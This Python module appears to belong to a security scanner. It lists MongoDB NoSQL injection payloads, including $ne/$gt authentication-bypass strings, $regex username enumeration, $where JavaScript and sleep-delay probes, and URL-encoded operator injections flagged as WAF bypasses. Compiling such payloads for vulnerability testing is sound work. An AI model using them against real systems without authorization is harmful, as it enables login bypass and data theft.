"""
NoSQL Injection Payloads

Collection of payloads for detecting NoSQL injection vulnerabilities,
primarily targeting MongoDB but also covering other NoSQL databases.
"""

from dataclasses import dataclass
from typing import List


@dataclass
class NoSQLPayload:
    """NoSQL injection payload."""
    payload: str
    technique: str
    description: str
    waf_bypass: bool
    risk_indicator: str
    target_db: str  # mongodb|couchdb|cassandra|generic


def get_nosql_payloads() -> List[NoSQLPayload]:
    """Get all NoSQL injection payloads."""

    payloads = []

    # ==== MONGODB OPERATOR INJECTION ====

    # $ne (not equal) - bypass authentication
    payloads.append(NoSQLPayload(
        payload='{"$ne": null}',
        technique="ne_operator",
        description="Not equal null - always true",
        waf_bypass=False,
        risk_indicator="authentication_bypass",
        target_db="mongodb"
    ))

    payloads.append(NoSQLPayload(
        payload='{"$ne": ""}',
        technique="ne_operator",
        description="Not equal empty string",
        waf_bypass=False,
        risk_indicator="authentication_bypass",
        target_db="mongodb"
    ))

    # $gt (greater than) - bypass authentication
    payloads.append(NoSQLPayload(
        payload='{"$gt": ""}',
        technique="gt_operator",
        description="Greater than empty string",
        waf_bypass=False,
        risk_indicator="authentication_bypass",
        target_db="mongodb"
    ))

    payloads.append(NoSQLPayload(
        payload='{"$gt": 0}',
        technique="gt_operator",
        description="Greater than zero",
        waf_bypass=False,
        risk_indicator="authentication_bypass",
        target_db="mongodb"
    ))

    # $regex - pattern matching attacks
    payloads.append(NoSQLPayload(
        payload='{"$regex": ".*"}',
        technique="regex_injection",
        description="Match all regex",
        waf_bypass=False,
        risk_indicator="data_extraction",
        target_db="mongodb"
    ))

    payloads.append(NoSQLPayload(
        payload='{"$regex": "^admin"}',
        technique="regex_injection",
        description="Starts with admin",
        waf_bypass=False,
        risk_indicator="username_enumeration",
        target_db="mongodb"
    ))

    # $where - JavaScript injection
    payloads.append(NoSQLPayload(
        payload='{"$where": "function() { return true; }"}',
        technique="where_injection",
        description="Always true function",
        waf_bypass=False,
        risk_indicator="javascript_execution",
        target_db="mongodb"
    ))

    payloads.append(NoSQLPayload(
        payload='{"$where": "sleep(5000)"}',
        technique="where_injection",
        description="Time-based detection",
        waf_bypass=False,
        risk_indicator="delay_5_seconds",
        target_db="mongodb"
    ))

    # $in - bypass filters
    payloads.append(NoSQLPayload(
        payload='{"$in": ["admin", "user", "guest"]}',
        technique="in_operator",
        description="Match multiple values",
        waf_bypass=False,
        risk_indicator="filter_bypass",
        target_db="mongodb"
    ))

    # $nin (not in) - inverse bypass
    payloads.append(NoSQLPayload(
        payload='{"$nin": ["blocked"]}',
        technique="nin_operator",
        description="Not in blocked list",
        waf_bypass=False,
        risk_indicator="filter_bypass",
        target_db="mongodb"
    ))

    # ==== JSON INJECTION (URL-ENCODED) ====

    # URL-encoded operator injection
    payloads.append(NoSQLPayload(
        payload='username[$ne]=admin&password[$ne]=',
        technique="url_encoded_operator",
        description="URL-encoded $ne injection",
        waf_bypass=True,
        risk_indicator="authentication_bypass",
        target_db="mongodb"
    ))

    payloads.append(NoSQLPayload(
        payload='username[$regex]=.*&password[$ne]=',
        technique="url_encoded_operator",
        description="URL-encoded regex + ne",
        waf_bypass=True,
        risk_indicator="authentication_bypass",
        target_db="mongodb"
    ))

    # ==== OPERATOR STACKING ====

    # Multiple operators
    payloads.append(NoSQLPayload(
        payload='{"$gt": "", "$ne": null}',
        technique="operator_stacking",
        description="Combine gt and ne",
        waf_bypass=False,
        risk_indicator="complex_bypass",
        target_db="mongodb"
    ))

    # ==== TIMING ATTACKS ====

    # Time-based detection via $where
    payloads.append(NoSQLPayload(
        payload='{"$where": "var start = new Date(); while((new Date() - start) < 5000);"}',
        technique="time_based",
        description="JavaScript delay loop",
        waf_bypass=False,
        risk_indicator="delay_5_seconds",
        target_db="mongodb"
    ))

    # ==== ARRAY INJECTION ====

    # Empty array bypass
    payloads.append(NoSQLPayload(
        payload='[]',
        technique="array_injection",
        description="Empty array",
        waf_bypass=False,
        risk_indicator="type_confusion",
        target_db="mongodb"
    ))

    return payloads


def get_auth_bypass_payloads() -> List[NoSQLPayload]:
    """Get payloads specifically for authentication bypass."""
    all_payloads = get_nosql_payloads()
    return [p for p in all_payloads if 'bypass' in p.risk_indicator]


def get_time_based_payloads() -> List[NoSQLPayload]:
    """Get time-based detection payloads."""
    all_payloads = get_nosql_payloads()
    return [p for p in all_payloads if 'delay' in p.risk_indicator or p.technique == 'time_based']


def get_db_specific_payloads(target_db: str) -> List[NoSQLPayload]:
    """Get payloads for a specific database type."""
    all_payloads = get_nosql_payloads()
    return [p for p in all_payloads if p.target_db == target_db or p.target_db == 'generic']
